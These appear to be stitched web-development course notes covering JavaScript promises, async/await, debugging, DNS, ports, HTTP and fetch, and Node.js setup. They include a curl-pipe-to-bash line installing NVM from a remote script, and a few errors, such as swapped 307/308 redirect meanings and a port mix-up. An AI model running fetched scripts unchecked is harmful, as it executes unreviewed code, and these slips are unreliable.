With the ability to asynchronously execute and set the resulting state, we now need a way to generically do something with the result of a promise after it resolves. This is done with functionality similar to exception handling. The promise object has three functions: then, catch, and finally. The then function is called if the promise is fulfilled, catch is called if the promise is rejected, and finally is always called after all the processing is completed.

We can rework our coinToss example and make it so 10 percent of the time the coin falls off the table and resolves to the rejected state. Otherwise the promise resolves to fulfilled with a result of either heads or tails.

const coinToss = new Promise((resolve, reject) => {
  setTimeout(() => {
    if (Math.random() > 0.1) {
      resolve(Math.random() > 0.5 ? 'heads' : 'tails');
    } else {
      reject('fell off table');
    }
  }, 10000);
});
We then chain the then, catch and finally functions to the coinToss object in order to handle each of the possible results.

coinToss
  .then((result) => console.log(`Coin toss result: ${result}`))
  .catch((err) => console.log(`Error: ${err}`))
  .finally(() => console.log('Toss completed'));

// OUTPUT:
//    Coin toss result: tails
//    Toss completed
☑ Assignment
This CodePen uses promises to order pizzas. Create a fork of the pen and take some time to experiment with it. Modify the CodePen to include a new function that makes the pizza and include it in the promise chain.

When you are done submit your CodePen URL to the Canvas assignment.

🧧 Possible solution
If you get stuck here is a possible solution.

JavaScript Async/await
📖 Deeper dive reading: MDN async function

JavaScript Promise objects are great for asynchronous execution, but as developers began to build large systems with promises they started wanting a more concise representation. This was provided with the introduction of the async/await syntax. The await keyword wraps the execution of a promise and removed the need to chain functions. The await expression will block until the promise state moves to fulfilled, or throws an exception if the state moves to rejected. For example, if we have a function that returns a coin toss promise.

const coinToss = () => {
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      if (Math.random() > 0.1) {
        resolve(Math.random() > 0.5 ? 'heads' : 'tails');
      } else {
        reject('fell off table');
      }
    }, 1000);
  });
};
We can create equivalent executions with either a promise then/catch chain, or an await with a try/catch block.

then/catch chain version

coinToss()
  .then((result) => console.log(`Toss result ${result}`))
  .catch((err) => console.error(`Error: ${err}`))
  .finally(() => console.log(`Toss completed`));
async, try/catch version

try {
  const result = await coinToss();
  console.log(`Toss result ${result}`);
} catch (err) {
  console.error(`Error: ${err}`);
} finally {
  console.log(`Toss completed`);
}
async
One important restriction for working with await is that you cannot call await unless it is called at the top level of the JavaScript, or is in a function that is defined with the async keyword. Applying the async keyword transforms the function so that it returns a promise that will resolve to the value that was previously returned by the function. Basically this turns any function into an asynchronous function, so that it can in turn make asynchronous requests.

This can be demonstrated with a function that makes animal noises. Notice that the return value is a simple string.

function cow() {
  return 'moo';
}
console.log(cow());
// OUTPUT: moo
If we designate the function to be asynchronous then the return value becomes a promise that is immediately resolved and has a value that is the return value of the function.

async function cow() {
  return 'moo';
}
console.log(cow());
// OUTPUT: Promise {<fulfilled>: 'moo'}
We then change the cow function to explicitly create a promise instead of the automatically generated promise that the await keyword generates.

async function cow() {
  return new Promise((resolve) => {
    resolve('moo');
  });
}
console.log(cow());
// OUTPUT: Promise {<pending>}
You can see that the promise is in the pending state because the promise's execution function has not yet resolved.

await
The async keyword declares that a function returns a promise. The await keyword wraps a call to the async function, blocks execution until the promise has resolved, and then returns the result of the promise.

We can demonstrate await in action with the cow promise from above. If we log the output from invoking cow then we see that the return value is a promise. However, if we prefix the call to the function with the await keyword, execution will stop until the promise has resolved, at which point the result of the promise is returned instead of the actual promise object.

console.log(cow());
// OUTPUT: Promise {<pending>}

console.log(await cow());
// OUTPUT: moo
By combining async, to define functions that return promises, with await, to wait on the promise, you can create code that is asynchronous, but still maintains the flow of the code without explicitly using callbacks.

Putting it all together
You can see the benefit for async/await clearly by considering a case where multiple promises are required. For example, when calling the fetch web API on an endpoint that returns JSON, you would need to resolve two promises. One for the network call, and one for converting the result to JSON. A promise implementation would look like the following.

const httpPromise = fetch('https://simon.cs260.click/api/user/me');
const jsonPromise = httpPromise.then((r) => r.json());
jsonPromise.then((j) => console.log(j));
console.log('done');

// OUTPUT: done
// OUTPUT: {email: 'bud@mail.com', authenticated: true}
With async/await, you can clarify the code intent by hiding the promise syntax, and also make the execution block until the promise is resolved.

const httpResponse = await fetch('https://simon.cs260.click/api/user/me');
const jsonResponse = await httpResponse.json();
console.log(jsonResponse);
console.log('done');

// OUTPUT: {email: 'bud@mail.com', authenticated: true}
// OUTPUT: done
☑ Assignment
Fork this CodePen that uses promises and convert it to use async/await.

When you are done submit your CodePen URL to the Canvas assignment.

🧧 Possible solution
If you get stuck here is a possible s

Debugging JavaScript
📖 Deeper dive reading: MDN Console

It is inevitable that your code is going to have problems, or bugs, at some point. That may be while you are originally authoring it, working on other code that changes assumed dependencies, or while enhancing the code with new functionality.

Learning how to quickly discover, and resolve, bugs will greatly increase your value as a web developer. Additionally, debugging skills can also be used during the development process. By following a pattern of writing a block of code and then stepping through, or debugging, the block, you gain confidence that the block is working as desired before moving on to the next block.

Console debugging
📖 Deeper dive reading: MDN Console

One of the simplest ways to debug your JavaScript code is to insert console.log functions that output the state of the code as it executes. For example, we can create a simple web application that has an HTML and JavaScript file that demonstrates the difference between let and var. By inserting console.log statements into the code, we can see what the value of each variable is as the code executes.

index.html

<body>
  <h1>Debugging</h1>
  <script src="index.js"></script>
</body>
index.js

var varCount = 20;
let letCount = 20;

console.log('Initial - var: %d, let: %d', varCount, letCount);

for (var varCount = 1; varCount < 2; varCount++) {
  for (let letCount = 1; letCount < 2; letCount++) {
    console.log('Loop - var: %d, let: %d', varCount, letCount);
  }
}

const h1El = document.querySelector('h1');
h1El.textContent = `Result - var:${varCount}, let:${letCount}`;
console.log('Final - var: %d, let: %d', varCount, letCount);
Take the following steps to see the result of console debugging.

Create the above files in a test directory named testConsole
Open the testConsole directory in VS Code
Run index.html using the VS Code Live Server extension
Open the Chrome browser debugger (press F12)
Select the Console tab
Refresh the browser
You should see the following result.

JavaScript console debugging

You can use the debugger console window to inspect variables without using the console.log function from your code. For example, if you type varCount in the console window it will print out the current value of varCount. You can also execute JavaScript directly in the console window. For example, if you type varCount = 50 and press Enter it will change the current value of varCount.

JavaScript console debugging variables

Browser debugging
console.log debugging is great for times when you just need to quickly see what is going on in your code, but to really understand the code as it executes you want to use the full capabilities of the browser's debugger.

Using the same setup we used for console.log debugging, open up Chrome's browser debugger, but this time select the source tab. This will display the source files that comprise the currently rendered content.

JavaScript source debugging

You can either select index.js from the source view on the left, or press CTRL-P (on Windows) or ⌘-P (on Mac) and then select index.js from the list that pops up. Then set a breakpoint on line 4 by clicking on the line number on the left of the displayed source code. This makes it so that the execution of code will pause whenever that line is executed. Refreshing the browser window will cause index.js to reload and pause on the breakpoint.

JavaScript breakpoint

With the browser paused in the debugger you can move your mouse cursor over a variable to see its value, see what variables are in scope, set watches on variables, or use the console to interact with the code.

This gives you complete control to inspect what the JavaScript code is doing and experiment with possible alternative directions for the code. Take some time to poke around in the debugger. Learning how to exploit its functionality will make you a much better web developer.

The internet globally connects independent networks and computing devices. In a simplistic way, you can think of the internet as a massive redundant collection of wires that connect up all the computers in the world. A lot of those wires are wireless (wiFi, satellite, or cell), and not all of computers in the world are connected, but generally that is what the internet is. The deeper your mental model of the internet is, the more effectively you will be able to create web applications.

Making connections
When one device wants to talk to another it must have an IP address. For example, 128.187.16.184 is BYU's address. Usually, human users prefer a symbolic name over an IP address. The symbolic name is called a domain name. Domain names are converted to IP address by doing a lookup in the Domain Name System (DNS). You can look up the IP address for any domain name using the dig console utility.
➜  dig byu.edu

byu.edu.		5755	IN	A	128.187.16.184


Once you have the IP address, you connect to the device it represents by first asking for a connection route to the device. A connection route consists of many hops across the network until the destination is dynamically discovered and the connection established. With the connection the transport and application layers start exchanging data.
Traceroute
You can determine the hops in a connection using the traceroute console utility. In the following example, we trace the route between a home computer and BYU. In the result you see the first address 192.168.1.1. This is the address of the network router the home computer is connected to. From there it goes through a couple devices that do not identify themselves and then hits the Google Fiber gateway. Google Fiber is the internet service provider, or ISP, for the requesting device. Then we jump through a few more unidentified devices before finally arriving at BYU (128.187.16.184).
➜  traceroute byu.edu

traceroute to byu.edu (128.187.16.184), 64 hops max, 52 byte packets
 1  192.168.1.1 (192.168.1.1)  10.942 ms  4.055 ms  4.694 ms
 2  * * *
 3  * * *
 4  192-119-18-212.mci.googlefiber.net (192.119.18.212)  5.369 ms  5.576 ms  6.456 ms
 5  216.21.171.197 (216.21.171.197)  6.283 ms  6.767 ms  5.532 ms
 6  * * *
 7  * * *
 8  * * *
 9  byu.com (128.187.16.184)  7.544 ms !X *  40.231 ms !X


If I run traceroute again I might see a slightly different route since every connection through the internet is dynamically calculated. The ability to discover a route makes the internet resilient when network devices fail or disappear from the network.
Network internals
The actual sending of data across the internet uses the TCP/IP model. This is a layered architecture that covers everything from the physical wires to the data that a web application sends. At the top of the TCP/IP protocol is the application layer. It represents user functionality, such as the web (HTTP), mail (SMTP), files (FTP), remote shell (SSH), and chat (IRC). Underneath that is the transport layer which breaks the application layer's information into small chunks and sends the data. The actual connection is made using the internet layer. This finds the device you want to talk to and keeps the connection alive. Finally, at the bottom of the model is the link layer which deals with the physical connections and hardware.
TCP/IP layers
Layer
Example
Purpose
Application
HTTPS
Functionality like web browsing
Transport
TCP
Moving connection information packets
Internet
IP
Establishing connections
Link
Fiber, hardware
Physical connections


Web servers
A web server is a computing device that is hosting a web service that knows how to accept incoming internet connections and speak the HTTP application protocol.
Monolithic web servers
In the early days of web programming, you would buy a massive, complex, expensive, software program that spoke HTTP and installed on a hardware server. The package of server and software was considered the web server because the web service software was the only thing running on the server.
When Berners-Lee wrote his first web server it only served up static HTML files. This soon advanced so that they allowed dynamic functionality, including the ability to generate all the HTML on demand in response to a users interaction. That facilitated what we now know as modern web applications.
Combining web and application services
Today, most modern programming languages include libraries that provide the ability to make connections and serve up HTTP. For example, here is a simple Go language program that is a fully functioning web service. Later on in the course we will show how this is done with JavaScript.
package main

import (
	"net/http"
)

func main() {
	// Serve up files found in the public_html directory
	fs := http.FileServer(http.Dir("./public_html"))
	http.Handle("/", fs)

	// Listen for HTTP requests
	http.ListenAndServe(":3000", nil)
}

Being able to easily create web services makes it easy to completely drop the monolithic web server concept and just build web services right into your web application. With our simple go example we can add a function that responds with the current time, when the /api/time resource is requested.
package main

import (
	"fmt"
	"io"
	"net/http"
	"time"
)

func getTime(w http.ResponseWriter, r *http.Request) {
	io.WriteString(w, time.Now().String())
}

func main() {
	// Serve up files found in the public_html directory
	fs := http.FileServer(http.Dir("./public_html"))
	http.Handle("/", fs)

	// Dynamically provide data
	http.HandleFunc("/api/time", getTime)

	// Listen for HTTP requests
	fmt.Println(http.ListenAndServe(":3000", nil))
}

We can run that web service code, and use the console application Curl to make an HTTP request and see the time response.
➜  curl localhost:3000/api/time

2022-12-03 09:50:37.391983 -0700

Web service gateways
Since it is so easy to build web services it is common to find multiple web services running on the same computing device. The trick is exposing the multiple services in a way that a connection can be made to each of them. Every network device allows for separate network connections by referring to a unique port number. Each service on the device starts up on a different port. In the example above, the go web service was using port 80. So you could just have a user access each service by referring to the port it was launched on. However, this makes it difficult for the user of the services to remember what port matches to which service. To resolve this we introduce a service gateway, or sometimes called a reverse proxy, that is itself a simple web service that listens on the common HTTPS port 443. The gateway then looks at the request and maps it to the other services running on a different ports.

Our web server will use the application Caddy as the gateway to our services. The details of how Caddy works will be given later.
Microservices
Web services that provide a single functional purpose are referred to as microservices. By partitioning functionality into small logical chunks, you can develop and manage them independently from other functionality in a larger system. They can also handle large fluctuations in user demand by simply running more and more stateless copies of the microservice from multiple virtual servers hosted in a dynamic cloud environment. For example, one microservice for generating your genealogical family tree might be able to handle 1,000 users concurrently. So in order to support 1 million users, you just deploy 1,000 instances of the service running on scalable virtual hardware.
Serverless
The idea of microservices naturally evolved into the world of serverless functionality where the server is conceptually removed from the architecture and you just write a function that speaks HTTP. That function is loaded through an gateway that maps a web request to the function. The gateway automatically scales the hardware needed to host the serverless function based on demand. This reduces what the web application developer needs to think about down to a single independent function.

Domain names
📖 Deeper dive reading: MDN What is a Domain Name
In the instruction about the internet we showed how an IP address can be referenced by a domain name. You can get the IP address for any domain using the dig console utility. Notice that in the following example there are actually multiple IP addresses associated with the domain name amazon.com. This allows for redundancy in case one of the IP addresses fails to successfully resolve to a valid connection because the server listening at that IP address is not responding.
➜  dig amazon.com

amazon.com.		126	IN	A	205.251.242.103
amazon.com.		126	IN	A	52.94.236.248
amazon.com.		126	IN	A	54.239.28.85

A domain name is simply a text string that follows a specific naming convention and is listed in a special database called the domain name registry.
Domain names are broken up into a root domain, with one or more possible subdomain prefixes. The root domain is represented by a secondary level domain and a top level domain. The top level domain (TLD) represent things like com, edu, or click. So a root domain would look something like byu.edu, google.com, or cs260.click. The possible list of TLDs is controlled by ICANN, one of the governing boards of the internet.

The owner of a root domain can create any number of subdomains off the root domain. Each subdomain may resolve to a different IP address. So the owner of cs260.click can have subdomains for travel (travel.cs260.click), finance (finance.cs260.click), or a blog (blog.cs260.click).
You can get information about a domain name from the domain name registry using the whois console utility.
➜  whois byu.edu

Domain Name: BYU.EDU

Registrant:
	Brigham Young University
	3009 ITB
	2027 ITB
	Provo, UT 84602
	USA

Administrative Contact:
	Mark Longhurst
	Brigham Young University
	Office of Information Technology
	1208 ITB
	Provo, UT 84602
	USA
	+1.8014220488
	markl@byu.edu

Technical Contact:
	Brent Goodman
	Brigham Young University
	Office of Information Technology
	1203J ITB
	Provo, UT 84602
	USA
	+1.8014227782
	dnsmaster@byu.edu

Domain record activated:    19-Jan-1987
Domain record last updated: 11-Jul-2022
Domain expires:             31-Jul-2025

This provides information such as a technical contact to talk to if there is a problem with the domain, and an administrative contact to talk to if you want to buy the domain. Maybe we should talk to Mark and see if he is willing to sell.
DNS
Once a domain name is in the registry it can be listed with a domain name system (DNS) server and associated with an IP address. Of course you must also lease the IP address before you can use it to uniquely identify a device on the internet, but that is a topic for another time. Every DNS server in the world references a few special DNS servers that are considered the authoritative name servers for associating a domain name with an IP address.
The DNS database records that facilitate the mapping of domain names to IP addresses come in several flavors. The main ones we are concerned with are the address (A) and the canonical name (CNAME) records. An A record is a straight mapping from a domain name to IP address. A CNAME record maps one domain name to another domain name. This acts as a domain name alias. You would use a CNAME to do things like map byu.com to the same IP address as byu.edu so that either one could be used.
When you enter a domain name into a browser, the browser first checks to see if it has the name already in its cache of names. If it does not, it contacts a DNS server and gets the IP address. The DNS server also keeps a cache of names. If the domain name is not in the cache, it will request the name from an authoritative name server. If the authority does not know the name then you get an unknown domain name error. If the process does resolve, then the browser makes the HTTP connection to the associated IP address.
As you can see, there is a lot of levels of name caching. This is done for performance reasons, but it also can be frustrating when you are trying to update the information associated with your domain name. This is where the time to live (TTL) setting for a domain record comes into play. You can set this to be something short like 5 minutes or as long as several days. The different caching layers should then honor the TTL and clear their cache after the requested period has passed.
Leasing a domain name
You can pay to lease an unused domain name for a specific period of time. Before the lease expires, you have the right to extend the lease for an additional amount of time. The cost to buy the domain varies from something like $3 to $200 a year. Buying, or sub-leasing, an existing domain name from a private party can be very expensive, and so you are better off buying something obscure like idigfor.gold (currently available for only $101). This is one reason why companies have such strange names these days.
Refer to the instruction on using Route 53 if you are interested in leasing a domain name.

Web services introduction
Up to this point, your entire application is loaded from your web server and runs on the user's browser. It starts when the browser requests the index.html file from the web server. The index.html, in turn, references other HTML, CSS, JavaScript, or image files. All of these files, that are running on the browser, comprise the frontend of your application.
Notice that when the frontend requests the application files from the web server it is using the HTTPS protocol. All web programming requests between devices use HTTPS to exchange data.

From our frontend JavaScript we can make requests to external services running anywhere in the world. This allows us to get external data, such as an inspirational quote, that we then inject into the DOM for the user to read. To make a web service request, we supply the URL of the web service to the fetch function that is built into the browser.

The next step in building a full stack web application, is to create our own web service. Our web service will provide the static frontend files along with functions to handle fetch requests for things like storing data persistently, providing security, running tasks, executing application logic that you don't want your user to be able to see, and communicating with other users. The functionality provided by your web service represents the backend of your application.
Generally the functions provided by a web service are called endpoints, or sometimes APIs. You access the web service endpoints from your frontend JavaScript with the fetch function. In the picture below, the backend web service is not only providing the static files that make up the frontend, but also providing the web service endpoints that the frontend calls to do things like get a user, create a user, or get high scores.

The backend web service can also use fetch to make requests to other web services. For example, in the image below the frontend uses fetch to request the user's data from the backend web service. The backend then uses fetch to call two other web services, one to get the user's data from the database, and another one to request subway routes that are near the user's home. That data is then combined together by the backend web service and returned to the frontend for display in the browser.

In following instruction we will discuss how to use fetch, HTTP, and URLs, and build a web service using the Node.js application. With all of this in place your application will be a full stack application comprised of both a frontend and a backend.

URL
📖 Deeper dive reading: MDN What is a URL
The Uniform Resource Locator (URL) represents the location of a web resource. A web resource can be anything, such as a web page, font, image, video stream, database record, or JSON object. It can also be completely ephemeral, such as a visitation counter, or gaming session.
Looking at the different parts of a URL is a good way to understand what it represents. Here is an example URL that represents the summary of accepted CS 260 BYU students that is accessible using secure HTTP.
https://byu.edu:443/cs/260/student?filter=accepted#summary

The URL syntax uses the following convention. Notice the delimiting punctuation between the parts of the URL. Most parts of the URL are optional. The only ones that are required are the scheme, and the domain name.
<scheme>://<domain name>:<port>/<path>?<parameters>#<anchor>

Part
Example
Meaning
Scheme
https
The protocol required to ask for the resource. For web applications, this is usually HTTPS. But it could be any internet protocol such as FTP or MAILTO.
Domain name
byu.edu
The domain name that owns the resource represented by the URL.
Port
3000
The port specifies the numbered network port used to connect to the domain server. Lower number ports are reserved for common internet protocols, higher number ports can be used for any purpose. The default port is 80 if the scheme is HTTP, or 443 if the scheme is HTTPS.
Path
/school/byu/user/8014
The path to the resource on the domain. The resource does not have to physically be located on the file system with this path. It can be a logical path representing endpoint parameters, a database table, or an object schema.
Parameters
filter=names&highlight=intro,summary
The parameters represent a list of key value pairs. Usually it provides additional qualifiers on the resource represented by the path. This might be a filter on the returned resource or how to highlight the resource. The parameters are also sometimes called the query string.
Anchor
summary
The anchor usually represents a sub-location in the resource. For HTML pages this represents a request for the browser to automatically scroll to the element with an ID that matches the anchor. The anchor is also sometimes called the hash, or fragment ID.

Technically you can also provide a user name and password before the domain name. This was used historically to authenticate access, but for security reasons this is deprecated. However, you will still see this convention for URLs that represent database connection strings.
URL, URN, and URI
You will sometimes hear the use of URN or URI when talking about web resources. A Uniform Resource Name (URN) is a unique resource name that does not specify location information. For example, a book URN might be urn:isbn:10,0765350386. A Uniform Resource Identifier (URI) is a general resource identifier that could refer to either a URL or a URN. With web programming you are almost always talking about URLs and therefore you should not use the more general URI.

Ports
When you connect to a device on the internet you need both an IP address and a numbered port. Port numbers allow a single device to support multiple protocols (e.g. HTTP, HTTPS, FTP, or SSH) as well as different types of services (e.g. search, document, or authentication). The ports may be exposed externally, or they may only be used internally on the device. For example, the HTTPS port (443) might allow the world to connect, the SSH port (22) might only allow computers at your school, and a service defined port (say 3000) may only allow access to processes running on the device.
The internet governing body, IANA, defines the standard usage for port numbers. Ports from 0 to 1023 represent standard protocols. Generally a web service should avoid these ports unless it is providing the protocol represented by the standard. Ports from 1024 to 49151 represent ports that have been assigned to requesting entities. However, it is very common for these ports to be used by services running internally on a device. Ports from 49152 to 65535 are considered dynamic and are used to create dynamic connections to a device. Here is the link to IANA's registry.
Here is a list of common port numbers that you might come across.
Port
Protocol
20
File Transfer Protocol (FTP) for data transfer
22
Secure Shell (SSH) for connecting to remote devices
25
Simple Mail Transfer Protocol (SMTP) for sending email
53
Domain Name System (DNS) for looking up IP addresses
80
Hypertext Transfer Protocol (HTTP) for web requests
110
Post Office Protocol (POP3) for retrieving email
123
Network Time Protocol (NTP) for managing time
161
Simple Network Management Protocol (SNMP) for managing network devices such as routers or printers
194
Internet Relay Chat (IRC) for chatting
443
HTTP Secure (HTTPS) for secure web requests

Your ports
As an example of how ports are used we can look at your web server. When you built your web server you externally exposed port 22 so that you could use SSH to open a remote console on the server, port 443 for secure HTTP communication, and port 80 for unsecure HTTP communication.

Your web service, Caddy, is listening on ports 80 and 443. When Caddy gets a request on port 80, it automatically redirects the request to port 443 so that a secure connection is used. When Caddy gets a request on port 443 it examines the path provided in the HTTP request (as defined by the URL) and if the path matches a static file, it reads the file off disk and returns it. If the HTTP path matches one of the definitions it has for a gateway service, Caddy makes a connection on that service's port (e.g. 3000 or 4000) and passes the request to the service.
Internally on your web server, you can have as many web services running as you would like. However, you must make sure that each one uses a different port to communicate on. You run your Simon service on port 3000 and therefore cannot use port 3000 for your startup service. Instead you use port 4000 for your startup service. It does not matter what high range port you use. It only matters that you are consistent and that they are only used by one service.

HTTP
📖 Deeper dive reading: MDN An overview of HTTP
Hypertext Transfer Protocol (HTTP) is how the web talks. When a web browser makes a request to a web server it does it using the HTTP protocol. In previous instruction we discussed how to use HTTP. Now, we will talk about the internals of HTTP. Just like becoming fluent in a foreign language makes a visit to another country more enjoyable, understanding how to speak HTTP helps you communicate effectively when talking on the web.
When a web client (e.g. a web browser) and a web server talk they exchange HTTP requests and responses. The browser will make an HTTP request and the server will generate an HTTP response. You can see the HTTP exchange by using the browser's debugger or by using a console tool like curl. For example, in your console you can use curl to make the following request.
curl -v -s http://info.cern.ch/hypertext/WWW/Helping.html

Request
The HTTP request for the above command would look like the following.
GET /hypertext/WWW/Helping.html HTTP/1.1
Host: info.cern.ch
Accept: text/html

An HTTP request has this general syntax.
<verb> <url path, parameters, anchor> <version>
[<header key: value>]*
[

  <body>
]

The first line of the HTTP request contains the verb of the request, followed by the path, parameters, and anchor of the URL, and finally the version of HTTP being used. The following lines are optional headers that are defined by key value pairs. After the headers you have an optional body. The body start is delimited from the headers with two new lines.
In the above example, we are asking to GET a resource found at the path /hypertext/WWW/Helping.html. The version used by the request is HTTP/1.1. This is followed by two headers. The first specifies the requested host (i.e. domain name). The second specifies what type of resources the client will accept. The resource type is always a MIME type as defined by internet governing body IANA. In this case we are asking for HTML.
Response
The response to the above request looks like this.
HTTP/1.1 200 OK
Date: Tue, 06 Dec 2022 21:54:42 GMT
Server: Apache
Last-Modified: Thu, 29 Oct 1992 11:15:20 GMT
ETag: "5f0-28f29422b8200"
Accept-Ranges: bytes
Content-Length: 1520
Connection: close
Content-Type: text/html

<TITLE>Helping -- /WWW</TITLE>
<NEXTID 7>
<H1>How can I help?</H1>There are lots of ways you can help if you are interested in seeing
the <A NAME=4 HREF=TheProject.html>web</A> grow and be even more useful...

An HTTP response has the following syntax.
<version> <status code> <status string>
[<header key: value>]*
[

  <body>
]

You can see that the response syntax is similar to the request syntax. The major difference is that the first line represents the version and the status of the response.
Understanding the meaning of the common HTTP verbs, status codes, and headers is important for you to understand, as you will use them in developing a web application. Take some time to internalize the following common values.
Verbs
There are several verbs that describe what the HTTP request is asking for. The list below only describes the most common ones.
Verb
Meaning
GET
Get the requested resource. This can represent a request to get a single resource or a resource representing a list of resources.
POST
Create a new resource. The body of the request contains the resource. The response should include a unique ID of the newly created resource.
PUT
Update a resource. Either the URL path, HTTP header, or body must contain the unique ID of the resource being updated. The body of the request should contain the updated resource. The body of the response may contain the resulting updated resource.
DELETE
Delete a resource. Either the URL path or HTTP header must contain the unique ID of the resource to delete.
OPTIONS
Get metadata about a resource. Usually only HTTP headers are returned. The resource itself is not returned.

Status codes
It is important that you use the standard HTTP status codes in your HTTP responses so that the client of a request can know how to interpret the response. The codes are partitioned into five blocks.
1xx - Informational.
2xx - Success.
3xx - Redirect to some other location, or that the previously cached resource is still valid.
4xx - Client errors. The request is invalid.
5xx - Server errors. The request cannot be satisfied due to an error on the server.
Within those ranges here are some of the more common codes. See the MDN documentation for a full description of status codes.
Code
Text
Meaning
100
Continue
The service is working on the request
200
Success
The requested resource was found and returned as appropriate.
201
Created
The request was successful and a new resource was created.
204
No Content
The request was successful but no resource is returned.
304
Not Modified
The cached version of the resource is still valid.
307
Permanent redirect
The resource is no longer at the requested location. The new location is specified in the response location header.
308
Temporary redirect
The resource is temporarily located at a different location. The temporary location is specified in the response location header.
400
Bad request
The request was malformed or invalid.
401
Unauthorized
The request did not provide a valid authentication token.
403
Forbidden
The provided authentication token is not authorized for the resource.
404
Not found
An unknown resource was requested.
408
Request timeout
The request takes too long.
409
Conflict
The provided resource represents an out of date version of the resource.
418
I'm a teapot
The service refuses to brew coffee in a teapot.
429
Too many requests
The client is making too many requests in too short of a time period.
500
Internal server error
The server failed to properly process the request.
503
Service unavailable
The server is temporarily down. The client should try again with an exponential back off.

Headers
📖 Deeper dive reading: MDN HTTP headers
HTTP headers specify metadata about a request or response. This includes things like how to handle security, caching, data formats, and cookies. Some common headers that you will use include the following.
Header
Example
Meaning
Authorization
Bearer bGciOiJIUzI1NiIsI
A token that authorized the user making the request.
Accept
image/*
The format the client accepts. This may include wildcards.
Content-Type
text/html; charset=utf-8
The format of the content being sent. These are described using standard MIME types.
Cookie
SessionID=39s8cgj34; csrftoken=9dck2
Key value pairs that are generated by the server and stored on the client.
Host
info.cern.ch
The domain name of the server. This is required in all requests.
Origin
cs260.click
Identifies the origin that caused the request. A host may only allow requests from specific origins.
Access-Control-Allow-Origin
https://cs260.click
Server response of what origins can make a request. This may include a wildcard.
Content-Length
368
The number of bytes contained in the response.
Cache-Control
public, max-age=604800
Tells the client how it can cache the response.
User-Agent
Mozilla/5.0 (Macintosh)
The client application making the request.

Body
The format of the body of an HTTP request or response is defined by the Content-Type header. For example, it may be HTML text (text/html), a binary image format (image/png), JSON (application/json), or JavaScript (text/javascript). A client may specify what formats it accepts using the accept header.
Cookies

📖 Deeper dive reading: MDN Using HTTP cookies
HTTP itself is stateless. This means that one HTTP request does not know anything about a previous or future request. However, that does not mean that a server or client cannot track state across requests. One common method for tracking state is the cookie. Cookies are generated by a server and passed to the client as an HTTP header.
HTTP/2 200
Set-Cookie: myAppCookie=tasty; SameSite=Strict; Secure; HttpOnly

The client then caches the cookie and returns it as an HTTP header back to the server on subsequent requests.
HTTP/2 200
Cookie: myAppCookie=tasty

This allows the server to remember things like the language preference of the user, or the user's authentication credentials. A server can also use cookies to track, and share, everything that a user does. However, there is nothing inherently evil about cookies; the problem comes from web applications that use them as a means to violate a user's privacy or inappropriately monetize their data.
HTTP Versions
HTTP continually evolves in order to increase performance and support new types of applications. You can read about the evolution of HTTP on MDN.
Year
Version
Features
1990
HTTP0.9
one line, no versions, only get
1996
HTTP1
get/post, header, status codes, content-type
1997
HTTP1.1
put/patch/delete/options, persistent connection
2015
HTTP2
multiplex, server push, binary representation
2022
HTTP3
QUIC for transport protocol, always encrypted


Fetch
🔑 Recommended reading: MDN Using the Fetch API
The ability to make HTTP requests from JavaScript is one of the main technologies that changed the web from static content pages (Web 1.0) to one of web applications (Web 2.0) that fully interact with the user. Microsoft introduced the first API for making HTTP requests from JavaScript with the XMLHttpRequest API.
Today, the fetch API is the preferred way to make HTTP requests. The fetch function is built into the browser's JavaScript runtime. This means you can call it from JavaScript code running in a browser.
The basic usage of fetch takes a URL and returns a promise. The promise then function takes a callback function that is asynchronously called when the requested URL content is obtained. If the returned content is of type application/json you can use the json function on the response object to convert it to a JavaScript object.
The following example makes a fetch request to get and display an inspirational quote. If the request method is unspecified, it defaults to GET.
fetch('https://api.quotable.io/random')
  .then((response) => response.json())
  .then((jsonResponse) => {
    console.log(jsonResponse);
  });

Response
{
  content: 'Never put off till tomorrow what you can do today.',
  author: 'Thomas Jefferson',
};

To do a POST request you populate the options parameter with the HTTP method and headers.
fetch('https://jsonplaceholder.typicode.com/posts', {
  method: 'POST',
  body: JSON.stringify({
    title: 'test title',
    body: 'test body',
    userId: 1,
  }),
  headers: {
    'Content-type': 'application/json; charset=UTF-8',
  },
})
  .then((response) => response.json())
  .then((jsonResponse) => {
    console.log(jsonResponse);
  });

☑ Assignment
Create a fork of this CodePen and experiment.
Replace the quotable service call with a different one. Here are some suggestions.
Random user - https://randomuser.me/api/
Jokes - https://api.chucknorris.io/jokes/random?category=dev
GitHub user - https://api.github.com/users/octocat
Photos - https://picsum.photos/id/0/info
Quote - https://api.quotable.io/random
When you are done submit your CodePen URL to the Canvas assignment.
Don't forget to update your GitHub startup repository notes.md with all of the things you learned and want to remember.

Node.js

In 2009 Ryan Dahl created Node.js. It was the first successful application for deploying JavaScript outside of a browser. This changed the JavaScript mindset from a browser technology to one that could run on the server as well. This means that JavaScript can power your entire technology stack. One language to rule them all. Node.js is often just referred to as Node, and is currently maintained by the Open.js Foundation.

“You can never understand everything. But, you should push yourself to understand the system”
— Ryan Dahl
Browsers run JavaScript using a JavaScript interpreter and execution engine. For example, Chromium based browsers all use the V8 engine created by Google. Node.js simply took the V8 engine and ran it inside of a console application. When you run a JavaScript program in Chrome or Node.js, it is V8 that reads your code and executes it. With either program wrapping V8, the result is the same.

Installing NVM and Node.js
Your production environment web server comes with Node.js already installed. However, you will need to install Node.js in your development environment if you have not already. The easiest way to install Node.js is to first install the Node Version Manager (NVM) and use it to install, and manage, Node.js.
Installing on Windows
If you are using Windows, then follow the installation instructions from the windows-nvm repository. Click on latest installer and then scroll down to the Assets and download and execute nvm-setup.exe. Once the installation is complete, you will need to open a new console window so that it gets the updated path that includes NVM.
In the console application install the long term support (LTS) version of Node.
➜ nvm install lts
➜ nvm use lts

Installing on Linux or MacOS
If you are using Linux or MacOS then you can install NVM with the following console commands.
➜ curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash

➜ . ~/.nvm/nvm.sh

In the console application install the long term support (LTS) version of Node.
➜ nvm install --lts

Checking that Node is installed
The node.js console application is simply called node. You can verify that Node is working correctly by running node with the -v parameter. Note that your version might be different than what is shown here. As long as it is an LTS version you should be fine.
➜ node -v
v20.10.0

Running programs
You can execute a line of JavaScript with Node.js from your console with the -e parameter.
➜  node -e "console.log(1+1)"
2

However, to do real work you need to execute an entire project composed of dozens or even hundreds of JavaScript files. You do this by creating a single starting JavaScript file, named something like index.js, that references the code found in the rest of your project. You then execute your code by running node with index.js as a parameter. For example, with the following JavaScript saved to a file named index.js
function countdown() {
  let i = 0;
  while (i++ < 5) {
    console.log(`Counting ... ${i}`);
  }
}

countdown();

